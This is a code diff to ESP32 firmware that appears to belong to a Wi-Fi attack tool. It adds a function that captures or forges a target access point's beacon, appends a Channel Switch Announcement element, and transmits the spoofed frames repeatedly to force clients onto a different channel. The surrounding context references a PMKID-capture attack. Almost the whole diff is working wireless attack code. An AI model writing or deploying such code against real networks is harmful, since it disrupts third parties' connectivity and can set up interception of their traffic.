@@ -901,6 +901,84 @@ esp_err_t wifi_attack_init(void)
     return ESP_OK;
 }
 
+/* CSA: 在驱动任务里只做一次 memcpy, 不能在这里解析或打印 */
+static uint8_t        s_csa_frame[RFTOOL_MAX_FRAME_LEN];
+static volatile int   s_csa_len = 0;
+static uint8_t        s_csa_want[6];
+
+static void csa_rx_cb(void *buf, wifi_promiscuous_pkt_type_t type)
+{
+    if (s_csa_len || !buf || type == WIFI_PKT_MISC) return;
+    const wifi_promiscuous_pkt_t *p = (const wifi_promiscuous_pkt_t *)buf;
+    if (p->rx_ctrl.rx_state != 0) return;
+    int len = p->rx_ctrl.sig_len - 4;
+    if (len < 36 || len > RFTOOL_MAX_FRAME_LEN) return;
+    const uint8_t *f = p->payload;
+    if (((f[0] >> 2) & 0x3) != 0) return;
+    if (((f[0] >> 4) & 0xF) != 0x8) return;              /* 只要 beacon */
+    if (memcmp(f + 16, s_csa_want, 6) != 0) return;      /* addr3 = BSSID */
+    memcpy(s_csa_frame, f, len);
+    s_csa_len = len;
+}
+
+esp_err_t wifi_attack_csa(const uint8_t bssid[6], const char *ssid_fallback,
+                          uint8_t ch, uint8_t new_ch, uint8_t count, bool dry,
+                          csa_result_t *res)
+{
+    if (!bssid || !res) return ESP_ERR_INVALID_ARG;
+    memset(res, 0, sizeof(*res));
+    if (!is_valid_channel(ch) || !is_valid_channel(new_ch)) return ESP_ERR_INVALID_ARG;
+    if (count == 0) count = 3;
+
+    wifi_attack_stop_all();
+    if (atomic_load(&s_state) != WIFI_ATK_IDLE) return ESP_ERR_INVALID_STATE;
+
+    esp_err_t e = esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
+    if (e != ESP_OK) return e;
+    atomic_store(&s_sniff_channel, ch);
+
+    /* 先在空中抓一份真实 beacon: 客户端会比对 BSSID 与 RSN, 拿真帧改比
+     * 凭空合成可靠. 抓不到才退到合成 (开放网络或 SSID 已知时也够用). */
+    memcpy(s_csa_want, bssid, 6);
+    s_csa_len = 0;
+    esp_wifi_set_promiscuous_rx_cb(csa_rx_cb);
+    esp_wifi_set_promiscuous(true);
+    TickType_t t0 = xTaskGetTickCount();
+    while (s_csa_len == 0 && (xTaskGetTickCount() - t0) < pdMS_TO_TICKS(800)) {
+        vTaskDelay(pdMS_TO_TICKS(20));
+    }
+    esp_wifi_set_promiscuous(false);
+
+    int len;
+    if (s_csa_len > 0) {
+        len = s_csa_len;
+        memcpy(res->bytes, s_csa_frame, (size_t)len);
+        res->cloned = true;
+    } else {
+        if (!ssid_fallback || !ssid_fallback[0]) return ESP_ERR_NOT_FOUND;
+        len = fb_beacon(res->bytes, sizeof(res->bytes), bssid,
+                        (const uint8_t *)ssid_fallback, (int)strlen(ssid_fallback), ch);
+        if (len <= 0) return ESP_FAIL;
+    }
+
+    int base = fb_append_csa(res->bytes, len, (int)sizeof(res->bytes), new_ch, count);
+    if (base <= 0) return ESP_ERR_INVALID_SIZE;
+    res->len = base;
+
+    if (dry) return ESP_OK;
+
+    for (int i = 0; i < count; i++) {
+        int cd = count - i;
+        if (cd < 1) cd = 1;
+        res->bytes[base - 1] = (uint8_t)cd;      /* CSA 的 countdown 是 IE 最后一字节 */
+        e = esp_wifi_80211_tx(WIFI_IF_STA, res->bytes, base, true);
+        if (e == ESP_OK) res->sent++;
+        else             res->fail++;
+        vTaskDelay(pdMS_TO_TICKS(100));
+    }
+    return res->sent ? ESP_OK : ESP_FAIL;
+}
+
 esp_err_t wifi_attack_pmkid_active(const uint8_t bssid[6], const char *ssid,
                                    uint8_t ch, uint32_t timeout_ms,
                                    int *m1_out, int *pmkid_out)
